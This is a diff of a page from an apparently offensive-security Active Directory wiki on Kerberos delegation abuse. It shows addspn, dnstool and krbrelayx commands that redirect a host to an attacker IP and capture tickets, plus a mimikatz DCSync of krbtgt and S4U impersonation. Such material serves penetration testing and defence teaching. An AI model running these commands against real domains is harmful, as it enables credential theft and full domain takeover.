@@ -34,7 +34,14 @@ In order to abuse the unconstrained delegations privileges of an account, an att
 
 This allows targets \(e.g. Domain Controllers or Exchange servers\) to authenticate back to the attacker machine.
 
-This can be done with [addspn](https://github.com/dirkjanm/krbrelayx), [dnstool](https://github.com/dirkjanm/krbrelayx) and [krbrelayx](https://github.com/dirkjanm/krbrelayx) \(Python\).
+All of this can be done from UNIX-like systems with [addspn](https://github.com/dirkjanm/krbrelayx), [dnstool](https://github.com/dirkjanm/krbrelayx) and [krbrelayx](https://github.com/dirkjanm/krbrelayx) \(Python\).
+
+{% hint style="info" %}
+When attacking accounts able to delegate without constraints, there are two major scenarios
+
+* **the account is a computer**: computers can edit their own SPNs via the `msDS-AdditionalDnsHostName` attribute. Since ticket received by krbrelayx will be encrypted with AES256 \(by default\), attackers will need to either supply the right AES256 key for the unconstrained delegations account \(`--aesKey` argument\) or the salt and password \(`--krbsalt` and `--krbpass` arguments\).
+* **the account is a user**: users can't edit their own SPNs like computers do. Attackers need to control an [account operator](../privileged-groups.md) \(or any other user that has the needed privileges\) to edit the user's SPNs. Moreover, since tickets received by krbrelayx will be encrypted with RC4, attackers will need to either supply the NT hash \(`-hashes` argument\) or the salt and password \(`--krbsalt` and `--krbpass` arguments\)
+{% endhint %}
 
 ```bash
 # 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
@@ -44,7 +51,7 @@ addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOM
 dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'
 
 # 3. Start the krbrelayx listener (the AES key is used by default by computer accounts to decrypt tickets)
-krbrelayx.py -aesKey 'CompromisedAccont_AES_key'
+krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'
 
 # 4. Authentication coercion
 ```
@@ -77,7 +84,7 @@ lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
 
 If a service account, configured with constrained delegation to another service, is compromised, an attacker can impersonate any user \(e.g. domain admin\) in the environment to access the second service.
 
-* If the service is configured with constrained delegation **without protocol transition**, then it works similarly to unconstrained delegation. The attacker controlled service needs to receive a user's ST in order to  use the embedded TGT as an identity proof. "Without protocol transition" means the Kerberos authentication protocol needs to be used all the way.
+* If the service is configured with constrained delegation **without protocol transition**, then it works similarly to unconstrained delegation. The attacker controlled service needs to receive a user's ST in order to use the embedded TGT as an identity proof. "Without protocol transition" means the Kerberos authentication protocol needs to be used all the way.
 * If the service is configured with constrained delegation **with protocol transition** then it doesn't need that user's ST. It can obtain it with a S4U2Self request and then use it with a S4U2Proxy request. The identity proof can either be a password, an NT hash or an AES key.
 
 Once the final "impersonating" ticket is obtained, it can be used with [Pass-the-Ticket](pass-the-ticket.md) to access the target service.
